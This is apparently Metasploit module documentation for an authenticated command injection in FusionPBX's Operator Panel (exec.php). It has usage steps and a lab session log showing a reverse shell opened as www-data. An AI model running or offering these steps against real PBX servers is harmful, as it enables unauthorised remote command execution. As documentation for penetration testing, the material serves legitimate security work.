## Description

  This module exploits an authenticated command injection vulnerability
  in FusionPBX versions 4.4.3 and prior.

  The `exec.php` file within the Operator Panel permits users with
  `operator_panel_view` permissions, or administrator permissions,
  to execute arbitrary commands as the web server user by sending
  a `system` command to the FreeSWITCH event socket interface.


## Vulnerable Software

  This module has been tested successfully on FusionPBX version
  4.4.1 on Ubuntu 19.04 (x64).

  Software:

  * https://github.com/fusionpbx/fusionpbx/releases


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec`
  3. Do: `set rhosts <IP>`
  4. Do: `run`
  5. You should get a new session


## Options

  **TARGETURI**

  The base path to FusionPBX (default: `/`)


## Scenarios

  ```
  msf5 > use exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec 
  msf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) > set rhosts 172.16.191.214
  rhosts => 172.16.191.214
  msf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) > set username test
  username => test
  msf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) > set password wBXxcY4LTAsMd46!
  password => wBXxcY4LTAsMd46!
  msf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) > set lhost 172.16.191.165
  lhost => 172.16.191.165
  msf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) > run

  [*] Started reverse TCP double handler on 172.16.191.165:4444 
  [+] Authenticated as user 'test'
  [*] Sending payload (295 bytes) ...
  [*] Accepted the first client connection...
  [*] Accepted the second client connection...
  [*] Command: echo ULzaVUoa3XPSZANH;
  [*] Writing to socket A
  [*] Writing to socket B
  [*] Reading from sockets...
  [*] Reading from socket A
  [*] A: "ULzaVUoa3XPSZANH\r\n"
  [*] Matching...
  [*] B is input...
  [*] Command shell session 1 opened (172.16.191.165:4444 -> 172.16.191.214:57626) at 2019-11-01 15:54:42 -0400

  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  pwd
  /
  uname -a
  Linux ubuntu-19-04-x64 5.0.0-32-generic #34-Ubuntu SMP Wed Oct 2 02:06:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  ```

